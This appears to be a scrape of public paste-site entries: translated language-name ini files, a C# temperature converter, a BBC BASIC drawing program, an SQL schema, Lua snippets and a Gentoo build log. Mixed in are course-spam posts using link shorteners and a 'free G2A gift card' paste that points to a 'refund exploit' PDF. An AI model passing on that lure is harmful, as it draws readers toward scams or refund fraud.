LANG_LB=luxemburgi
LANG_NL=holland
LANG_NO=norvég
LANG_PL=lengyel
LANG_PT=portugál
LANG_RO=román
LANG_RU=orosz
LANG_SK=szlovák
LANG_SL=szlovén
LANG_SR=szerb
LANG_SV=svéd
LANG_TR=török
LANG_ZH=kínai

Icelandic.ini
LANG_BAR=bæverska
LANG_CA=katalónska
LANG_CS=tékkneska
LANG_DA=danska
LANG_DE=þýska
LANG_DE_AT=austurríska
LANG_EL=gríska
LANG_EN=enska
LANG_ES=spænska
LANG_ES_PE=perúska
LANG_EU=baskneska
LANG_FI=finnska
LANG_FR=franska
LANG_GD=skosk gelíska
LANG_GL=galisíska
LANG_HR=króatíska
LANG_HU=ungverska
LANG_IS=íslenska
LANG_IT=ítalska
LANG_JA=japanska
LANG_KSH=kölníska
LANG_LB=lúxemborgíska
LANG_NL=hollenska
LANG_NO=norska
LANG_PL=pólska
LANG_PT=portúgalska
LANG_RO=rúmenska
LANG_RU=rússneska
LANG_SK=slóvakíska
LANG_SL=slóvenska
LANG_SR=serbneska
LANG_SV=sænska
LANG_TR=tyrkneska
LANG_ZH=kínverska

Italian.ini
LANG_BAR=bavarese
LANG_CA=catalano
LANG_CS=ceco
LANG_DA=danese
LANG_DE=tedesco
LANG_DE_AT=austriaco
LANG_EL=greco
LANG_EN=inglese
LANG_ES=spagnolo
LANG_ES_PE=peruviano
LANG_EU=basco
LANG_FI=finlandese
LANG_FR=francese
LANG_GD=gaelico scozzese
LANG_GL=galiziano
LANG_HR=croato
LANG_HU=ungherese
LANG_IS=islandese
LANG_IT=italiano
LANG_JA=giapponese
LANG_KSH=coloniese
LANG_LB=lussemburghese
LANG_NL=olandese
LANG_NO=norvegese
LANG_PL=polacco
LANG_PT=portoghese
LANG_RO=rumeno
LANG_RU=russo
LANG_SK=slovacco
LANG_SL=sloveno
LANG_SR=serbo
LANG_SV=svedese
LANG_TR=turco
LANG_ZH=cinese

Japanese.ini
LANG_BAR=バイエルン語
LANG_CA=カタロニア語
LANG_CS=チェコ語
LANG_DA=デンマーク語
LANG_DE=ドイツ語
LANG_DE_AT=オーストリア語
LANG_EL=ギリシャ語
LANG_EN=英語
LANG_ES=スペイン語
LANG_ES_PE=ペルー語
LANG_EU=バスク語
LANG_FI=フィンランド語
LANG_FR=フランス語
LANG_GD=スコットランド・ゲール語
LANG_GL=ガリシア語
LANG_HR=クロアチア語
LANG_HU=ハンガリー語
LANG_IS=アイスランド語
LANG_IT=イタリア語
LANG_JA=日本語
LANG_KSH=ケルン語
LANG_LB=ルクセンブルク語
LANG_NL=オランダ語
LANG_NO=ノルウェー語
LANG_PL=ポーランド語
LANG_PT=ポルトガル語
LANG_RO=ルーマニア語
LANG_RU=ロシア語
LANG_SK=スロバキア語
LANG_SL=スロベニア語
LANG_SR=セルビア語
LANG_SV=スウェーデン語
LANG_TR=トルコ語
LANG_ZH=中国語

Luxembourgish.ini
LANG_BAR=Bairesch
LANG_CA=Katalanesch
LANG_CS=Tschechesch
LANG_DA=Dänesch
LANG_DE=Däitsch
LANG_DE_AT=Éisträichesch
LANG_EL=Griichesch
LANG_EN=Englesch
LANG_ES=Spuenesch
LANG_ES_PE=Peruanesch
LANG_EU=Baskesch
LANG_FI=Finnesch
LANG_FR=Franséisch
LANG_GD=Schottescht Gällesch
LANG_GL=Galizesch
LANG_HR=Kroatesch
LANG_HU=Ungaresch
LANG_IS=Islännesch
LANG_IT=Italienesch
LANG_JA=Japanesch
LANG_KSH=Kölsch
LANG_LB=Lëtzebuergesch
LANG_NL=Hollännesch
LANG_NO=Norwegesch
LANG_PL=Polnesch
LANG_PT=Portugisesch
LANG_RO=Rumänesch
LANG_RU=Russesch
LANG_SK=Slowakesch
LANG_SL=Slowenesch
LANG_SR=Serbesch
LANG_SV=Schwedesch
LANG_TR=Tierkesch
LANG_ZH=Chinesesch

Norwegian.ini
LANG_BAR=bairisk
LANG_CA=katalansk
LANG_CS=tsjekkisk
LANG_DA=dansk
LANG_DE=tysk
LANG_DE_AT=østerriksk
LANG_EL=gresk
LANG_EN=engelsk
LANG_ES=spansk
LANG_ES_PE=peruansk
LANG_EU=baskisk
LANG_FI=finsk
LANG_FR=fransk
LANG_GD=skotsk-gælisk
LANG_GL=galisisk
LANG_HR=kroatisk
LANG_HU=ungarsk
LANG_IS=islandsk
LANG_IT=italiensk
LANG_JA=japansk
LANG_KSH=kølnsk
LANG_LB=luxemburgsk
LANG_NL=nederlandsk
LANG_NO=norsk
LANG_PL=polsk
LANG_PT=portugisisk
LANG_RO=rumensk
LANG_RU=russisk
LANG_SK=slovakisk
LANG_SL=slovensk
LANG_SR=serbisk
LANG_SV=svensk
LANG_TR=tyrkisk
LANG_ZH=kinesisk

Polish.ini
LANG_BAR=bawarski
LANG_CA=kataloński
LANG_CS=czeski
LANG_DA=duński
LANG_DE=niemiecki
LANG_DE_AT=austriacki
LANG_EL=grecki
LANG_EN=angielski
LANG_ES=hiszpański
LANG_ES_PE=peruwiański
LANG_EU=baskijski
LANG_FI=fiński
LANG_FR=francuski
LANG_GD=szkocki gaelicki
LANG_GL=galicyjski
LANG_HR=chorwacki
LANG_HU=węgierski
LANG_IS=islandzki
LANG_IT=włoski
LANG_JA=japoński
LANG_KSH=gwara kolońska
LANG_LB=luksemburski
LANG_NL=niderlandzki
LANG_NO=norweski
LANG_PL=polski
LANG_PT=portugalski
LANG_RO=rumuński
LANG_RU=rosyjski
LANG_SK=słowacki
LANG_SL=słoweński
LANG_SR=serbski
LANG_SV=szwedzki
LANG_TR=turecki
LANG_ZH=chiński

Portuguese.ini
LANG_BAR=bávaro
LANG_CA=catalão
LANG_CS=tcheco
LANG_DA=dinamarquês
LANG_DE=alemão
LANG_DE_AT=australiano
LANG_EL=grego
LANG_EN=inglês
LANG_ES=espanhol
LANG_ES_PE=peruano
LANG_EU=basco
LANG_FI=finlandês
LANG_FR=francês
LANG_GD=gaélico escocês
LANG_GL=galego
LANG_HR=croata
LANG_HU=húngaro
LANG_IS=islandês
LANG_IT=italiano
LANG_JA=japonês
LANG_KSH=kölsch
LANG_LB=luxemburguês
LANG_NL=holandês
LANG_NO=norueguês
LANG_PL=polonês
LANG_PT=português
LANG_RO=romeno
LANG_RU=russo
LANG_SK=eslovaco
LANG_SL=esloveno
LANG_SR=sérvio
LANG_SV=sueco
LANG_TR=turco
LANG_ZH=chinês

Romanian.ini
LANG_BAR=bavareză
LANG_CA=catalană
LANG_CS=cehă
LANG_DA=daneză
LANG_DE=germană
LANG_DE_AT=austriacă
LANG_EL=greacă
LANG_EN=engleză
LANG_ES=spaniolă
LANG_ES_PE=peruviană
LANG_EU=bască
LANG_FI=finlandeză
LANG_FR=franceză
LANG_GD=gaelică scoțiană
LANG_GL=galiciană
LANG_HR=croată
LANG_HU=maghiară
LANG_IS=islandeză
LANG_IT=italiană
LANG_JA=japoneză
LANG_KSH=kölsch
LANG_LB=luxemburgheză
LANG_NL=neerlandeză
LANG_NO=norvegiană
LANG_PL=poloneză
LANG_PT=portugheză
LANG_RO=română
LANG_RU=rusă
LANG_SK=slovacă
LANG_SL=slovenă
LANG_SR=sârbă
LANG_SV=suedeză
LANG_TR=turcă
LANG_ZH=chineză

Russian.ini
LANG_BAR=баварский
LANG_CA=каталанский
LANG_CS=чешский
LANG_DA=датский
LANG_DE=немецкий
LANG_DE_AT=австрийский
LANG_EL=греческий
LANG_EN=английский
LANG_ES=испанский
LANG_ES_PE=перуанский
LANG_EU=баскский
LANG_FI=финский
LANG_FR=французский
LANG_GD=гэльский
LANG_GL=галисийский
LANG_HR=хорватский
LANG_HU=венгерский
LANG_IS=исландский
LANG_IT=итальянский
LANG_JA=японский
LANG_KSH=кёльнский
LANG_LB=люксембургский
LANG_NL=нидерландский
LANG_NO=норвежский
LANG_PL=польский
LANG_PT=португальский
LANG_RO=румынский
LANG_RU=русский
LANG_SK=словацкий
LANG_SL=словенский
LANG_SR=сербский
LANG_SV=шведский
LANG_TR=турецкий
LANG_ZH=китайский

Serbian.ini
LANG_BAR=bavarski
LANG_CA=katalonski
LANG_CS=češki
LANG_DA=danski
LANG_DE=nemački
LANG_DE_AT=austrijski
LANG_EL=grčki
LANG_EN=engleski
LANG_ES=španski
LANG_ES_PE=peruanski
LANG_EU=baskijski
LANG_FI=finski
LANG_FR=francuski
LANG_GD=škotski gelski
LANG_GL=galicijski
LANG_HR=hrvatski
LANG_HU=mađarski
LANG_IS=islandski
LANG_IT=italijanski
LANG_JA=japanski
LANG_KSH=kelnski
LANG_LB=luksemburški
LANG_NL=holandski
LANG_NO=norveški
LANG_PL=poljski
LANG_PT=portugalski
LANG_RO=rumunski
LANG_RU=ruski
LANG_SK=slovački
LANG_SL=slovenački
LANG_SR=srpski
LANG_SV=švedski
LANG_TR=turski
LANG_ZH=kineski

Slovak.ini
LANG_BAR=bavorčina
LANG_CA=katalánčina
LANG_CS=čeština
LANG_DA=dánčina
LANG_DE=nemčina
LANG_DE_AT=rakúčina
LANG_EL=gréčtina
LANG_EN=angličtina
LANG_ES=španielčina
LANG_ES_PE=peruánčina
LANG_EU=baskičtina
LANG_FI=fínčina
LANG_FR=francúzština
LANG_GD=škótska gaelčina
LANG_GL=galícijčina
LANG_HR=chorvátčina
LANG_HU=maďarčina
LANG_IS=islandčina
LANG_IT=taliančina
LANG_JA=japončina
LANG_KSH=kolínčina
LANG_LB=luxemburčina
LANG_NL=holandčina
LANG_NO=nórčina
LANG_PL=poľština
LANG_PT=portugalčina
LANG_RO=rumunčina
LANG_RU=ruština
LANG_SK=slovenčina
LANG_SL=slovinčina
LANG_SR=srbčina
LANG_SV=švédčina
LANG_TR=turečtina
LANG_ZH=čínština

Slovenian.ini
LANG_BAR=bavarščina
LANG_CA=katalonščina
LANG_CS=češčina
LANG_DA=danščina
LANG_DE=nemščina
LANG_DE_AT=avstrijščina
LANG_EL=grščina
LANG_EN=angleščina
LANG_ES=španščina
LANG_ES_PE=perujščina
LANG_EU=baskovščina
LANG_FI=finščina
LANG_FR=francoščina
LANG_GD=škotska gelščina
LANG_GL=galicijščina
LANG_HR=hrvaščina
LANG_HU=madžarščina
LANG_IS=islandščina
LANG_IT=italijanščina
LANG_JA=japonščina
LANG_KSH=kölnsko narečje
LANG_LB=luksemburščina
LANG_NL=nizozemščina
LANG_NO=norveščina
LANG_PL=poljščina
LANG_PT=portugalščina
LANG_RO=romunščina
LANG_RU=ruščina
LANG_SK=slovaščina
LANG_SL=slovenščina
LANG_SR=srbščina
LANG_SV=švedščina
LANG_TR=turščina
LANG_ZH=kitajščina

Spanish.ini
LANG_BAR=bávaro
LANG_CA=catalán
LANG_CS=checo
LANG_DA=danés
LANG_DE=alemán
LANG_DE_AT=austríaco
LANG_EL=griego
LANG_EN=inglés
LANG_ES=español
LANG_ES_PE=peruano
LANG_EU=euskera
LANG_FI=finés
LANG_FR=francés
LANG_GD=gaélico escocés
LANG_GL=gallego
LANG_HR=croata
LANG_HU=húngaro
LANG_IS=islandés
LANG_IT=italiano
LANG_JA=japonés
LANG_KSH=kölsch
LANG_LB=luxemburgués
LANG_NL=neerlandés
LANG_NO=noruego
LANG_PL=polaco
LANG_PT=portugués
LANG_RO=rumano
LANG_RU=ruso
LANG_SK=eslovaco
LANG_SL=esloveno
LANG_SR=serbio
LANG_SV=sueco
LANG_TR=turco
LANG_ZH=chino

Swedish.ini
LANG_BAR=bayerska
LANG_CA=katalanska
LANG_CS=tjeckiska
LANG_DA=danska
LANG_DE=tyska
LANG_DE_AT=österrikiska
LANG_EL=grekiska
LANG_EN=engelska
LANG_ES=spanska
LANG_ES_PE=peruanska
LANG_EU=baskiska
LANG_FI=finska
LANG_FR=franska
LANG_GD=skotsk gäliska
LANG_GL=galiciska
LANG_HR=kroatiska
LANG_HU=ungerska
LANG_IS=isländska
LANG_IT=italienska
LANG_JA=japanska
LANG_KSH=kölniska
LANG_LB=luxemburgiska
LANG_NL=nederländska
LANG_NO=norska
LANG_PL=polska
LANG_PT=portugisiska
LANG_RO=rumänska
LANG_RU=ryska
LANG_SK=slovakiska
LANG_SL=slovenska
LANG_SR=serbiska
LANG_SV=svenska
LANG_TR=turkiska
LANG_ZH=kinesiska"
rj7aQsTU,Converts Celsius to Fahrenheit,maus234,C#,Friday 19th of January 2024 05:40:30 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Test1._1
{

    class TemperatureConverter
    {
        // Converts Celsius to Fahrenheit
        public static double CelsiusToFahrenheit(double celsius)
        {
            return celsius * 9 / 5 + 32; // Linear transformation from Celsius to Fahrenheit
        }
        public static double FahrenheitToCelsius (double fahrenheit) 
        {
            return (fahrenheit - 32) * 5 / 9;  // Linear transformation from Fahrenheit to Celsius

        }


    }
    class Program 
    {
        static void Main(string[] args)
        {
            // Test data
            double[] testCelsius = new double[] { 0, 100, -40 };
            double[] testFahrenheit = new double[] { 32, 212, -40 };

            // Test Celsius to Fahrenheit conversion
            foreach (double temp in testCelsius)
            {
                Console.WriteLine($""{temp} degrees Celsius is equal to {TemperatureConverter.CelsiusToFahrenheit(temp)} degrees Fahrenheit"");
            }

            // Test Fahrenheit to Celsius conversion
            foreach (double temp in testFahrenheit)
            {
                Console.WriteLine($""{temp} degrees Fahrenheit is equal to {TemperatureConverter.FahrenheitToCelsius(temp)} degrees Celsius"");
            }
        }
    }
}"
a3Ak74qX,LUIS FERRARI SCALABLE,lovejoy777,ZXBasic,Friday 19th of January 2024 05:35:11 PM CDT,"   10 REM ******************************
   20 REM *        AGON LIGHT 2        *
   30 REM *      BBC BASIC MODE 8      *
   40 REM *         320 X 240          *
   50 REM *     DRAW LUIS FERRARI      *
   60 REM *                            *
   70 REM *     BY STEVE LOVEJOY       *
   80 REM *  A HUGE THANKS TO MILTONW  *
   90 REM ******************************
   95 :
  100 VDU 22,8          : REM SET SCREEN MODE.
  110 VDU 23,1,0        : REM DISABLE CURSOR.
  120 VDU 12            : REM SAME AS CLS (clear text from screen).
  130 VDU 16            : REM SAME AS CLG (clear graphics from screen).
  140 VDU 18,0,9        : REM SAME AS GCOL (set colour of graphics).
  150 SW% = 1280        : REM SCREEN WIDTH IN GRAPHICAL UNITS.
  160 SH% = 1024        : REM SCREEN HEIGHT IN GRAPHICAL UNITS.
  170 AX% = SW%/2-400   : REM X START COORDS (center of screen -400).
  180 AY% = SH%/2-50    : REM Y START COORDS (center of screen -50).
  190 SC = 5.0          : REM ASSIGN FLOAT FOR SCALE (LUIS PLAY WITH THIS #).
  200 :
  210 PROC_DRAW         : REM CALL THE DRAW PROCESS.
  220 :
  230 END               : REM **** END OF PROGRAM ****
  240 :
 1000 REM **** DRAW AGON ****.
 1010 DEF PROC_DRAW     : REM DRAW PROCESS.
 1020 DIM XY% (1024)    : REM BIG ENOUGH NUMBER TO HOLD DATA ALL.
 1030 :
 1040 REPEAT            : REM LOOP
 1050     READ X%,Y%            : REM GET DATA FOR X & Y.
 1060     IF X% >= 0 GOTO 1140  : REM IF X% IS 0 OR ABOVE DRAW.
 1070         REM SPECIAL VALUES, EITHER MOVE OR END.
 1080         IF X% = -12345 GOTO 1150                : REM IF X IS END MARKER.
 1090           X% = ABS(X%)                          : REM IF X IS A MINUS # MOVE (NOT DRAW), ABS CONVERTS TO POSITIVE #.
 1100           Y% = ABS(Y%)                          : REM IF X IS A MINUS # MOVE (NOT DRAW), ABS CONVERTS TO POSITIVE #.
 1110           MOVE AX% + (X% * SC), AY% + (Y% * SC) : REM **** MOVE ****
 1120           GOTO 1150
 1130     REM ELSE
 1140           DRAW AX% + (X% * SC), AY% + (Y% * SC) : REM **** DRAW ****
 1150     REM ENDIF
 1160 UNTIL X% = -12345 AND Y% = -12345               : REM LOOP UNTIL END MARKERS.
 1170 :
 1180 ENDPROC                                         : REM END DRAW PROCESS.
 1200 :
 1210 DATA -5,-1,7,4,1,11,18,17,11,20,11,16,-18,-17,43,23
 1220 DATA 55,25,-49,-24,60,22,-55,-25,60,23,-55,-25,53,16,53,12
 1230 DATA 54,6,55,1,49,1,47,9,43,12,39,14,36,14,35,14
 1240 DATA 30,12,27,9,23,1,5,1,-15,-11,19,11,19,13,15,13
 1250 DATA 15,11,-3,-9,25,9,-55,-1,97,1,99,5,100,9,101,14
 1260 DATA 101,19,100,23,60,23,86,34,85,36,54,25,-47,-9,52,9
 1270 DATA 100,9,-74,-18,111,12,112,14,112,17,111,20,74,18,-75,-23
 1280 DATA 83,31,-101,-23,136,23,113,35,104,37,101,23,-104,-37,125,27
 1290 DATA 124,23,-122,-23,123,28,-119,-23,120,27,-117,-23,118,26,-115,-23
 1300 DATA 116,27,-111,-23,114,29,-109,-23,111,30,-107,-23,109,31,-105,-23
 1310 DATA 107,32,-103,-23,105,33,-136,-23,159,25,113,35,-159,-25,162,27
 1320 DATA 162,14,160,11,157,6,146,2,142,9,160,9,-157,-12,157,14
 1340 DATA 153,14,153,12,157,12,-142,-9,138,13,134,14,131,14,128,14
 1350 DATA 123,13,119,11,117,9,114,1,49,1,-117,-9,100,9,-110,-7
 1370 DATA 103,7,102,5,110,5,110,7,-95,-23,96,25,97,26,98,26
 1380 DATA 99,25,100,23
 1390 :
 1400 DATA  -12345, -12345 : REM END MARKERS.
 1380 :"
usDj5SMR,Untitled,f0f077,Java,Friday 19th of January 2024 05:11:52 PM CDT,"Java Data Structures and Algorithms Masterclass
100+ DSA Interview Questions for Cracking FAANG with Animated Examples for Deeper Understanding and Faster Learning
Learn, implement, and use different Data Structures
Learn, implement and use different Algorithms
Become a better developer by mastering computer science fundamentals
Learn everything you need to ace difficult coding interviews
Cracking the Coding Interview with 100+ questions with explanations
for more:https://cuty.io/OYfO7kv"
GdSpHNLX,Untitled,f0f077,Python,Friday 19th of January 2024 05:07:57 PM CDT,"The Complete Data Structures and Algorithms Course in Python
100+ DSA Interview Questions for Cracking FAANG with Animated Examples for Deeper Understanding and Faster Learning
Welcome to the Complete Data Structures and Algorithms in Python Bootcamp, the most modern, and the most complete Data Structures and Algorithms in Python course on the internet.

At 40+ hours, this is the most comprehensive course online to help you ace your coding interviews and learn about Data Structures and Algorithms in Python. You will see 100+ Interview Questions done at the top technology companies such as Apple,Amazon, Google and Microsoft and how to face Interviews with comprehensive visual explanatory video materials which will bring you closer towards landing the tech job of your dreams!
for more:https://cuty.io/np3jjJAcI"
rDPj6DxF,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Friday 19th of January 2024 05:06:50 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_312154.pdf
 
Working as of
19 January 2024"
a73XE3vB,Untitled,f0f077,Python,Friday 19th of January 2024 05:03:54 PM CDT,"Data Structures and Algorithms in Python
Visualize the inner workings of data structures and algorithms, line by line, through comprehensive animations
 Building reliable and highly performant software requires knowledge that goes beyond a certain programming language or framework. It requires a solid understanding of how data is organized in memory, how it can be manipulated, sorted or searched into. 
for more:https://cuty.io/I2tvyDQQM"
dn01bXKx,Test TalentPitch,Al0rse,SQL,Friday 19th of January 2024 04:53:20 PM CDT,"CREATE TABLE users (
    id INT PRIMARY KEY,
    name VARCHAR(255),
    email VARCHAR(255) UNIQUE,
    image_path VARCHAR(255) NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

CREATE TABLE challenges (
    id INT PRIMARY KEY,
    title VARCHAR(255),
    description TEXT,
    difficulty INT,
    user_id INT,
    FOREIGN KEY (user_id) REFERENCES users(id),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

CREATE TABLE companies (
    id INT PRIMARY KEY,
    name VARCHAR(255),
    image_path VARCHAR(255) NULL,
    location VARCHAR(255),
    industry VARCHAR(255),
    user_id INT,
    FOREIGN KEY (user_id) REFERENCES users(id),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

CREATE TABLE programs (
    id INT PRIMARY KEY,
    title VARCHAR(255),
    description TEXT,
    start_date DATE,
    end_date DATE,
    user_id INT,
    FOREIGN KEY (user_id) REFERENCES users(id),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

CREATE TABLE program_participants (
    id INT PRIMARY KEY,
    program_id INT,
    entity_type VARCHAR(50), -- Indicar el tipo de entidad: 'user', 'challenge', 'company'
    entity_id INT, -- ID de la entidad participante
    FOREIGN KEY (program_id) REFERENCES programs(id),
    FOREIGN KEY (entity_id, entity_type) REFERENCES users(id, 'user') -- Ajustar para otras entidades
);

"
uCPDkpXJ,Arch,archosaur,Lua,Friday 19th of January 2024 04:36:40 PM CDT,"---Returns true is current slot contains a fuel item
---@return Boolean
function Is_fuel()
    return turtle.refuel(0)
end

---Return name of item in current slot.
---returns ""no item"" if slot is empty
---@return string
function Get_item_name()
    local Name = ""no item""
    local Item_detail = turtle.getItemDetail()

    if Item_detail ~= nil then
        Name = Item_detail.name
    end

    return Name
end"
VTuezZTp,partial emerge.log parsed by Perl script for GenPi64,jlpoole,Bash,Friday 19th of January 2024 04:16:57 PM CDT,"Fri Jan 19 02:15:11 PM PST 2024
Secs    Minute  Completion date Order   Package
198     3 min 18 secs   Thu Jan 18 16:33:58 2024        1 of 1  sys-apps/portage-3.0.61-r1
102     1 min 42 secs   Thu Jan 18 16:35:40 2024        1 of 7  dev-util/shadowman-3
54      0 min 54 secs   Thu Jan 18 16:36:34 2024        4 of 7  dev-libs/jsoncpp-1.9.5
67      1 min 7 secs    Thu Jan 18 16:37:41 2024        2 of 7  app-crypt/rhash-1.4.3
40      0 min 40 secs   Thu Jan 18 16:38:21 2024        5 of 7  dev-libs/libuv-1.47.0-r1
270     4 min 30 secs   Thu Jan 18 16:42:51 2024        3 of 7  app-arch/libarchive-3.7.2
1125    18 min 45 secs  Thu Jan 18 17:01:36 2024        6 of 7  dev-build/cmake-3.27.9
296     4 min 56 secs   Thu Jan 18 17:06:32 2024        7 of 7  dev-util/ccache-4.8.3
302     5 min 2 secs    Thu Jan 18 17:11:34 2024        2 of 87 acct-group/polkitd-0-r2
21      0 min 21 secs   Thu Jan 18 17:11:55 2024        3 of 87 acct-group/messagebus-0-r2
23      0 min 23 secs   Thu Jan 18 17:12:18 2024        1 of 87 dev-lang/duktape-2.7.0-r3
65      1 min 5 secs    Thu Jan 18 17:13:23 2024        4 of 87 acct-user/polkitd-0-r2
22      0 min 22 secs   Thu Jan 18 17:13:45 2024        5 of 87 acct-user/messagebus-0-r2
68      1 min 8 secs    Thu Jan 18 17:14:53 2024        6 of 87 dev-libs/gobject-introspection-common-1.78.1
181     3 min 1 secs    Thu Jan 18 17:17:54 2024        7 of 87 sys-libs/libseccomp-2.5.5
82      1 min 22 secs   Thu Jan 18 17:19:16 2024        8 of 87 app-text/docbook-xml-dtd-4.4-r3
1834    30 min 34 secs  Thu Jan 18 17:49:50 2024        9 of 87 dev-libs/libunistring-1.1-r1
989     16 min 29 secs  Thu Jan 18 18:06:19 2024        10 of 87        sys-libs/pam-1.5.3
649     10 min 49 secs  Thu Jan 18 18:17:08 2024        11 of 87        sys-apps/util-linux-2.39.2-r1
194     3 min 14 secs   Thu Jan 18 18:20:22 2024        12 of 87        sys-apps/attr-2.5.1-r2
450     7 min 30 secs   Thu Jan 18 18:27:52 2024        13 of 87        dev-libs/expat-2.5.0
4193    69 min 53 secs  Thu Jan 18 19:37:45 2024        14 of 87        sys-devel/gettext-0.22.4
188     3 min 8 secs    Thu Jan 18 19:40:53 2024        15 of 87        sys-apps/acl-2.3.1-r2
875     14 min 35 secs  Thu Jan 18 19:55:28 2024        16 of 87        app-arch/tar-1.35
1141    19 min 1 secs   Thu Jan 18 20:14:29 2024        17 of 87        sys-devel/binutils-2.41-r2
361     6 min 1 secs    Thu Jan 18 20:20:30 2024        18 of 87        net-dns/libidn2-2.3.4-r1
648     10 min 48 secs  Thu Jan 18 20:31:18 2024        19 of 87        sys-apps/diffutils-3.10
181     3 min 1 secs    Thu Jan 18 20:34:19 2024        20 of 87        sys-libs/libcap-2.69
658     10 min 58 secs  Thu Jan 18 20:45:17 2024        21 of 87        sys-apps/grep-3.11
779     12 min 59 secs  Thu Jan 18 20:58:16 2024        22 of 87        sys-devel/m4-1.4.19-r2
109     1 min 49 secs   Thu Jan 18 21:00:05 2024        23 of 87        dev-build/autoconf-2.71-r6
168     2 min 48 secs   Thu Jan 18 21:02:53 2024        24 of 87        dev-build/automake-1.16.5-r1
441     7 min 21 secs   Thu Jan 18 21:10:14 2024        25 of 87        dev-build/libtool-2.4.7-r1
402     6 min 42 secs   Thu Jan 18 21:16:56 2024        26 of 87        dev-libs/libgpg-error-1.47-r1
708     11 min 48 secs  Thu Jan 18 21:28:44 2024        27 of 87        sys-apps/texinfo-7.1-r1
496     8 min 16 secs   Thu Jan 18 21:37:00 2024        28 of 87        dev-libs/libgcrypt-1.10.2
298     4 min 58 secs   Thu Jan 18 21:41:58 2024        29 of 87        sys-devel/flex-2.6.4-r6
13871   231 min 11 secs Fri Jan 19 01:33:09 2024        30 of 87        sys-devel/gcc-13.2.1_p20230826
238     3 min 58 secs   Fri Jan 19 01:37:07 2024        31 of 87        app-crypt/libb2-0.98.1-r3
83      1 min 23 secs   Fri Jan 19 01:38:30 2024        32 of 87        dev-perl/Locale-gettext-1.70.0-r1
637     10 min 37 secs  Fri Jan 19 01:49:07 2024        33 of 87        app-text/opensp-1.5.2-r10
679     11 min 19 secs  Fri Jan 19 02:00:26 2024        34 of 87        app-text/po4a-0.66
542     9 min 2 secs    Fri Jan 19 02:09:28 2024        35 of 87        dev-lang/tcl-8.6.13-r1
715     11 min 55 secs  Fri Jan 19 02:21:23 2024        36 of 87        dev-db/sqlite-3.44.2-r1
2533    42 min 13 secs  Fri Jan 19 03:03:36 2024        37 of 87        dev-lang/python-3.11.7
927     15 min 27 secs  Fri Jan 19 03:19:03 2024        38 of 87        sys-apps/findutils-4.9.0-r2
360     6 min 0 secs    Fri Jan 19 03:25:03 2024        39 of 87        sys-apps/file-5.45-r3
632     10 min 32 secs  Fri Jan 19 03:35:35 2024        40 of 87        sys-apps/sed-4.9
287     4 min 47 secs   Fri Jan 19 03:40:22 2024        41 of 87        dev-build/make-4.4.1-r1
247     4 min 7 secs    Fri Jan 19 03:44:29 2024        42 of 87        sys-apps/kmod-31
335     5 min 35 secs   Fri Jan 19 03:50:04 2024        45 of 87        sys-auth/passwdqc-2.0.3-r1
35      0 min 35 secs   Fri Jan 19 03:50:39 2024        43 of 87        sys-process/psmisc-23.6
29      0 min 29 secs   Fri Jan 19 03:51:08 2024        44 of 87        dev-libs/libbsd-0.11.7-r2
385     6 min 25 secs   Fri Jan 19 03:57:33 2024        46 of 87        dev-libs/elfutils-0.190
54      0 min 54 secs   Fri Jan 19 03:58:27 2024        47 of 87        virtual/libelf-3-r1
752     12 min 32 secs  Fri Jan 19 04:10:59 2024        48 of 87        sys-devel/bison-3.8.2-r2
2527    42 min 7 secs   Fri Jan 19 04:53:06 2024        49 of 87        dev-lang/python-3.12.1_p1
146     2 min 26 secs   Fri Jan 19 04:55:32 2024        50 of 87        app-text/xmlto-0.0.28-r11
276     4 min 36 secs   Fri Jan 19 05:00:08 2024        51 of 87        app-crypt/pinentry-1.2.1-r4
170     2 min 50 secs   Fri Jan 19 05:02:58 2024        52 of 87        app-crypt/rhash-1.4.3
253     4 min 13 secs   Fri Jan 19 05:07:11 2024        53 of 87        dev-libs/libuv-1.47.0-r1
263     4 min 23 secs   Fri Jan 19 05:11:34 2024        54 of 87        dev-libs/npth-1.6-r1
1039    17 min 19 secs  Fri Jan 19 05:28:53 2024        55 of 87        net-libs/gnutls-3.7.8
76      1 min 16 secs   Fri Jan 19 05:30:09 2024        56 of 87        dev-util/glib-utils-2.78.3
402     6 min 42 secs   Fri Jan 19 05:36:51 2024        57 of 87        dev-libs/glib-2.78.3
109     1 min 49 secs   Fri Jan 19 05:38:40 2024        58 of 87        x11-misc/shared-mime-info-2.2
98      1 min 38 secs   Fri Jan 19 05:40:18 2024        59 of 87        dev-util/desktop-file-utils-0.27
294     4 min 54 secs   Fri Jan 19 05:45:12 2024        60 of 87        dev-libs/gobject-introspection-1.78.1
434     7 min 14 secs   Fri Jan 19 05:52:26 2024        61 of 87        sys-apps/systemd-utils-254.7
54      0 min 54 secs   Fri Jan 19 05:53:20 2024        62 of 87        virtual/libudev-251-r2
270     4 min 30 secs   Fri Jan 19 05:57:50 2024        63 of 87        sys-auth/elogind-246.10-r3
582     9 min 42 secs   Fri Jan 19 06:07:32 2024        64 of 87        sys-apps/dbus-1.15.6
147     2 min 27 secs   Fri Jan 19 06:09:59 2024        65 of 87        sys-auth/polkit-123
85      1 min 25 secs   Fri Jan 19 06:11:24 2024        66 of 87        sys-auth/pambase-20220214
428     7 min 8 secs    Fri Jan 19 06:18:32 2024        68 of 87        sys-apps/debianutils-5.14
32      0 min 32 secs   Fri Jan 19 06:19:04 2024        67 of 87        sys-apps/shadow-4.14.2
120     2 min 0 secs    Fri Jan 19 06:21:04 2024        69 of 87        app-misc/ca-certificates-20230311.3.95
442     7 min 22 secs   Fri Jan 19 06:28:26 2024        70 of 87        sys-apps/gawk-5.3.0
